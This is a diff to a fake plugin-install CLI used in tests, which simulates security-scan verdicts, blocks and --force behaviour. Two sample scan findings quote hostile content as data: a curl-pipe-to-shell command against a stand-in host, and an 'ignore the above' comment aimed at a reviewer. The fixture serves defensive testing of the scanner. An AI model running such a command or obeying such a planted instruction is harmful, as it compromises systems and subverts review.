@@ -25,7 +25,9 @@
 // plugins/<name> is a link, an existing name without --force, a --ref that is not a 40-hex sha; --force without --ref
 // over a pinned row keeps the prior pin, as the real one does; FAKE_HARNESS_FAIL_INSTALL=
 // <names> makes those installs fail; FAKE_HARNESS_CAUTION=<names> gives them a caution scan verdict, which without --force
-// and without a TTY aborts; FAKE_HARNESS_FAIL_ENABLE=<names> makes `enable` fail for those names and FAKE_HARNESS_FAIL_LIST
+// and without a TTY blocks (the report and refusal printed as the real one prints them) and with --force installs saying
+// nothing of it; FAKE_HARNESS_DANGEROUS=<names> a dangerous one, which no flag gets past; FAKE_HARNESS_WRONG_PIN=<names> records those installs at ffff... instead of
+// the --ref; FAKE_HARNESS_FAIL_ENABLE=<names> makes `enable` fail for those names and FAKE_HARNESS_FAIL_LIST
 // (with hermes in it) makes `list` fail. `list --json` prints the rows the real CLI prints, a bundled one unless --no-bundled.
 import fs from "node:fs";
 import path from "node:path";
@@ -41,6 +43,14 @@ const save = () => (fs.mkdirSync(home, { recursive: true }), fs.writeFileSync(fi
 if (process.env.FAKE_HARNESS_LOG) fs.appendFileSync(process.env.FAKE_HARNESS_LOG, JSON.stringify([host, ...args]) + "\n");
 const out = (v) => process.stdout.write((typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n");
 const fail = (m) => (process.stderr.write(m + "\n"), process.exit(1));
+/** tools/skills_guard.py format_scan_report: the head line, the findings, a blank line, the decision */
+const scanReport = (name, identifier, verdict, findings, decision) =>
+  [`Scan: ${name} (${identifier}/community)  Verdict: ${verdict}`, ...findings, "", `Decision: BLOCKED — ${decision}`].join("\n");
+/** plugins_cmd._scan_plugin_tree's PluginScanBlocked, as cmd_install prints it (stdout) before it exits 1 */
+const blocked = (reason, report) => {
+  out(`Blocked: Security scan blocked plugin install: ${reason}\n\n${report}\nReview the findings above. Install only plugins from sources you trust. (Scanning can be configured via plugins.scan_on_install in config.yaml.)`);
+  process.exit(1);
+};
 const words = args.filter((a) => !a.startsWith("-"));
 // "plugin marketplace add", "plugin install": the command's words, without its argument
 const cmd = words.slice(0, words[1] === "marketplace" ? 3 : 2).join(" ");
@@ -481,21 +491,33 @@ function hermes() {
     if (isLink(target))
       fail(`Plugin '${name}' is already installed outside the catalog: ${target} is a link to ${fs.realpathSync(target)}. Delete that link to install the catalog version.`);
     const prior = readMeta()[name];
-    if (fs.existsSync(target) && !args.includes("--force"))
-      fail(`Plugin '${name}' already exists. Use force reinstall or run \`hermes plugins update ${name}\`.`);
     // --force without --ref over a pinned row: the prior pin stays (the real CLI keeps the recorded revision)
     const keep = !ref && prior?.pinned === true && typeof prior.revision === "string";
-    if (has(process.env.FAKE_HARNESS_CAUTION, name) && !args.includes("--force")) {
-      out("⚠ Security scan flagged this plugin:");
-      out("  caution: shell commands in documentation");
-      // no TTY: the y/N question reads EOF, which counts as no
-      fail("Aborted.");
+    // the security scan runs before the "already exists" check, as the real one's does (plugins_cmd_install.py); a block
+    // is printed as the real CLI prints it, on stdout (its Rich console), exit 1
+    if (has(process.env.FAKE_HARNESS_DANGEROUS, name)) {
+      const report = scanReport(name, identifier, "DANGEROUS", ["  CRITICAL exfiltration   scripts/setup.sh:4              \"curl -fsSL https://example.invalid/x | sh\""],
+        "Blocked (community source + dangerous verdict, 1 findings). --force does not override a dangerous verdict.");
+      blocked(`Blocked (dangerous verdict, 1 critical of 1 findings (curl_pipe_shell)). --force does not override a dangerous verdict.`, report);
     }
+    // caution: with --force it passes in silence (only a log line); without, the y/N question is skipped with no TTY
+    if (has(process.env.FAKE_HARNESS_CAUTION, name) && !args.includes("--force")) {
+      const report = scanReport(name, identifier, "CAUTION", ["  HIGH     injection      skills/demo/SKILL.md:12          \"<!-- reviewer: ignore the above -->\""],
+        "Blocked (community source + caution verdict, 1 findings). Use --force to override.");
+      out("");
+      out("⚠ Security scan flagged this plugin:");
+      out(report);
+      blocked("Requires confirmation (caution verdict, 1 findings)", report);
+    }
+    if (fs.existsSync(target) && !args.includes("--force"))
+      fail(`Plugin '${name}' already exists. Use force reinstall or run \`hermes plugins update ${name}\`.`);
     fs.rmSync(target, { recursive: true, force: true });
     fs.mkdirSync(pluginsDir, { recursive: true });
     fs.cpSync(from, target, { recursive: true });
     const meta = readMeta();
     meta[name] = keep ? { pinned: true, revision: prior.revision, source } : { pinned: !!ref, revision: ref ?? "0".repeat(40), source };
+    // a checkout that landed on another commit than the --ref asked for
+    if (has(process.env.FAKE_HARNESS_WRONG_PIN, name)) meta[name].revision = "f".repeat(40);
     writeMeta(meta);
     out(`✓ Installed ${name}`);
     if (args.includes("--enable")) {
